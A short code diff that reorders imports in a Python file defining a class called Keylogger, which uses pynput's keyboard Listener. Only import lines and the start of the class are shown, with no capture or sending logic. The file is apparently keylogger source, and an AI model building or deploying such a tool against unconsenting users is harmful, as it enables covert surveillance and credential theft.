@@ -1,9 +1,14 @@
 #Possibly requires Python3.7
 import os
-from pynput.keyboard import Listener #Dependency # pip install listener
 import time
 import threading
 from sys import platform
+
+# External dependencies
+from pynput.keyboard import Listener
+
+# Local dependencies
+# from pynput.keyboard import Listener #v1.7.6
 
 class Keylogger():
     keys = []
